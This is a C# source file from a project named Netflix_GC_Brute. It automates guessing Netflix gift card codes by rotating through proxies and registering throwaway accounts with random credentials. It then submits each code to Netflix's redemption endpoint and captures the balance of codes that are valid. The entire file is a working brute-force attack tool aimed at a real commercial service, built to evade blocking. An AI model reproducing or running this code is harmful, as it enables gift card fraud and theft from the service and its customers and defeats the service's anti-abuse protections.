using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices.WindowsRuntime;
using System.Text;
using Netflix_GC_Brute.Helpers;
using Netflix_GC_Brute.Utils;
using Newtonsoft.Json;
using xNet;
using HttpStatusCode = xNet.HttpStatusCode;

namespace Netflix_GC_Brute.Callers
{
    public class Netflix
    {
        public string[] ProxyList;
        public string ProxyType;

        private readonly Random _random = new Random();

        public delegate void Callback(string code, string proxy, bool valid, string error, string balance);

        public void Check(string code, Callback callback)
        {
            string proxy = string.Empty;

            while (true)
            {
                if (string.IsNullOrEmpty(proxy))
                    proxy = ProxyList[_random.Next(ProxyList.Length)];

                try
                {
                    #region Starting Signup Session

                    var req = new HttpRequest
                    {
                       Proxy = proxy,
                        Type = ProxyType,
                        UserAgent =
                            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36"
                    };

                    req.AddHeader("Referer", "https://www.netflix.com/fr-FR/");
                    req.AddHeader("Accept",
                        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3");

                    HttpResponse res = req.Start(HttpMethod.GET,
                        AsUri("https://www.netflix.com/signup?action=startAction&locale=fr-FR"), AsBytesContent(""));

                    if (res == null) throw new HttpException("Proxy was unable to reach target.");
                    if (res.StatusCode != HttpStatusCode.OK) throw new HttpException("Status code isn't OK.");

                    string response = res.ToString();

                    #endregion

                    #region Select Plan

                    string esn = response.Split(new[] {"{\"esnGeneratorModel\":{\"data\":{\"esn\":\""},
                            StringSplitOptions.None)[1]
                        .Split(new[] {"\""}, StringSplitOptions.None)[0];

                    string authUrl = ParseAuthUrl(response.Split(new[] {"\"isInFreeTrial\":null,\"authURL\":\""},
                            StringSplitOptions.None)[1]
                        .Split(new[] {"\""}, StringSplitOptions.None)[0]);

                    req.AddHeader("Referer", "https://www.netflix.com/signup/planform");
                    req.AddHeader("Accept", "application/json, text/javascript, */*; q=0.01");
                    req.Cookies = res.Cookies; // Uses previous request cookies

                    res = req.Start(HttpMethod.POST,
                        AsUri(
                            $"https://www.netflix.com/api/shakti/v5fa268ce/flowendpoint?mode=planSelection&flow=signupSimplicity&landingURL=%2Fsignup%2Fplanform&landingOrigin=https%3A%2F%2Fwww.netflix.com&inapp=false&esn={esn}&languages=fr-FR&netflixClientPlatform=browser"),
                        AsBytesContent("{\"action\":\"planSelectionAction\",\"authURL\":\"" + authUrl +
                                       "\",\"fields\":{\"planChoice\":{\"value\":\"10338\"},\"previousMode\":\"planSelectionWithContext\"}}"));

                    if (res == null) throw new HttpException("Proxy was unable to reach target.");
                    if (res.StatusCode != HttpStatusCode.OK) throw new HttpException("Status code isn't OK.");

                    #endregion

                    #region Registering Account

                    req.AddHeader("Referer", "https://www.netflix.com/signup/regform");
                    req.AddHeader("Accept", "application/json, text/javascript, */*; q=0.01");
                    req.Cookies = res.Cookies; // Uses previous request cookies

                    res = req.Start(HttpMethod.POST,
                        AsUri(
                            $"https://www.netflix.com/api/shakti/v5fa268ce/flowendpoint?mode=registration&flow=signupSimplicity&landingURL=%2Fsignup%2Fregform&landingOrigin=https%3A%2F%2Fwww.netflix.com&inapp=false&esn={esn}&languages=fr-FR&netflixClientPlatform=browser"),
                        AsBytesContent("{\"action\":\"registerOnlyAction\",\"authURL\":\"" + authUrl +
                                       "\",\"fields\":{\"email\":{\"value\":\"" +
                                       StringUtils.RandomString(16) + "@gmail.com" +
                                       "\"},\"password\":{\"value\":\"" +
                                       StringUtils.RandomString(10) +
                                       "\"},\"emailPreference\":{\"value\":false},\"previousMode\":\"registrationWithContext\"}}"));

                    if (res == null) throw new HttpException("Proxy was unable to reach target.");
                    if (res.StatusCode != HttpStatusCode.OK) throw new HttpException("Status code isn't OK.");

                    response = res.ToString();

                    try
                    {
                        authUrl = ParseAuthUrl(response.Split(
                                new[] {"\"netflixClientPlatform\":\"browser\",\"authURL\":\""},
                                StringSplitOptions.None)[1]
                            .Split(new[] {"\""}, StringSplitOptions.None)[0]); // Get new authURL
                    }
                    catch (Exception)
                    {
                        // ignored
                    }

                    #endregion

                    #region Redeem The Code

                    req.AddHeader("Referer", "https://www.netflix.com/signup/giftoption");
                    req.AddHeader("Accept", "application/json, text/javascript, */*; q=0.01");
                    req.Cookies = res.Cookies; // Uses previous request cookies

                    res = req.Start(HttpMethod.POST,
                        AsUri(
                            $"https://www.netflix.com/api/shakti/v5fa268ce/flowendpoint?mode=giftOptionMode&flow=signupSimplicity&landingURL=%2Fsignup%2Fgiftoption&landingOrigin=https%3A%2F%2Fwww.netflix.com&inapp=false&esn={esn}&languages=fr-FR&netflixClientPlatform=browser"),
                        AsBytesContent("{\"action\":\"codeRedeemAction\",\"authURL\":\"" +
                                       authUrl + "\",\"fields\":{\"code\":{\"value\":\"" +
                                       code +
                                       "\"},\"planChoice\":{\"value\":\"10338\"},\"paymentChoice\":{\"value\":\"giftOption\"},\"previousMode\":\"payAndStartMembershipWithContext\"}}"));

                    if (res == null) throw new HttpException("Proxy was unable to reach target.");
                    if (res.StatusCode != HttpStatusCode.OK) throw new HttpException("Status code isn't OK.");

                    response = res.ToString();
                    var jsonData = JsonConvert.DeserializeObject<dynamic>(response);

                    #endregion

                    bool valid = jsonData.fields.errorCode == null;

                    if (!valid)
                    {
                        callback.Invoke(code, proxy, valid, (string) jsonData.fields.errorCode.value,
                            null);
                        break;
                    }

                    #region Capture the code balance

                    req.AddHeader("Referer", "https://www.netflix.com/signup/giftoption");
                    req.AddHeader("Accept", "application/json, text/javascript, */*; q=0.01");
                    req.Cookies = res.Cookies; // Uses previous request cookies

                    res = req.Start(HttpMethod.POST,
                        AsUri(
                            $"https://www.netflix.com/api/shakti/v5fa268ce/flowendpoint?mode=giftOptionMode&flow=signupSimplicity&landingURL=%2Fsignup%2Fgiftoption&landingOrigin=https%3A%2F%2Fwww.netflix.com&inapp=false&esn={esn}&languages=fr-FR&netflixClientPlatform=browser"),
                        AsBytesContent("{\"action\":\"codeRedeemAction\",\"authURL\":\"" + authUrl +
                                       "\",\"fields\":{\"code\":{\"value\":\"" + code +
                                       "\"},\"planChoice\":{\"value\":\"10338\"},\"paymentChoice\":{\"value\":\"giftOption\"},\"previousMode\":\"payAndStartMembershipWithContext\"}}"));

                    if (res == null) throw new HttpException("Proxy was unable to reach target.");
                    if (res.StatusCode != HttpStatusCode.OK)
                        throw new HttpException($"Status code isn't OK (Status: {res.StatusCode})");

                    response = res.ToString();
                    jsonData = JsonConvert.DeserializeObject<dynamic>(response);

                    if (jsonData.fields.paymentChoice == null)
                    {
                        callback.Invoke(code, proxy, false, "Unable to determine balance",
                            null);
                        break;
                    }

                    string balance = jsonData.fields.paymentChoice.options[2].fields.giftAmount.value;

                    // SPECIFIC CASE: Valid, balance captured
                    callback.Invoke(code, proxy, valid, (string) jsonData.fields.errorCode.value, balance);

                    break;

                    #endregion
                }
                catch (HttpException exp)
                {
                    callback.Invoke(code, proxy, false,
                        exp.Message.StartsWith("Status code") ? "Banned proxy" : "Proxy timed out", null);

                    proxy = string.Empty;
                }
                catch (Exception exp)
                {
                    if (Debugger.IsAttached)
                        Console.WriteLine($"[Exception] {exp.Message} - {exp.StackTrace}");
                }
            }
        }

        private Uri AsUri(string source) => new Uri(source);

        private BytesContent AsBytesContent(string source) => new BytesContent(Encoding.Default.GetBytes(source))
            {ContentType = "application/json"};

        private string ParseAuthUrl(string source) =>
            source.Replace("\\x3D", "=").Replace("\\x2B", "+").Replace("\\x2F", "/");
    }
}